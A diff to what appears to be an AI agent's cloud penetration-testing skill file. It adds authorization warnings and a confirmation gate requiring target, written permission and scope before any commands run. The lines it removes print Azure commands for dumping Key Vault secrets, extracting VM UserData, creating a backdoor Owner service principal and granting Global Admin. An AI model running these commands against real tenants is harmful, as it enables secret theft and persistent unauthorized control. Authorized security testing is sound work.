@@ -8,6 +8,20 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/clou
 ---
 
 
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
+> **Mandatory confirmation gate**
+> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+> 1. Ask the user to state the exact target URL, IP, account, or resource.
+> 2. Ask the user to confirm written authorization and the permitted scope.
+> 3. Show the exact command(s) and explain their expected effect.
+> 4. Wait for explicit confirmation in the current conversation.
+>
+> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # Cloud Penetration Testing
@@ -168,28 +182,4 @@ foreach($user in $users){
 # Execute commands on VMs
 Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1
 
-# Extract VM UserData
-$vms = Get-AzVM
-$vms.UserData
-
-# Dump Key Vault secrets
-az keyvault list --query '[].name' --output tsv
-az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
-az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
-az keyvault secret show --id <URI>
-```
-
-### Phase 5: Azure Persistence
-
-Establish persistence in Azure:
-
-```powershell
-# Create backdoor service principal
-$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
-$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
-$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
-
-# Add service principal to Global Admin
-$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
-$role = Get-MsolRole -RoleName "Company Administrator"
-Add-MsolRoleMember -RoleObjectId $role.ObjectI
+# Extract V
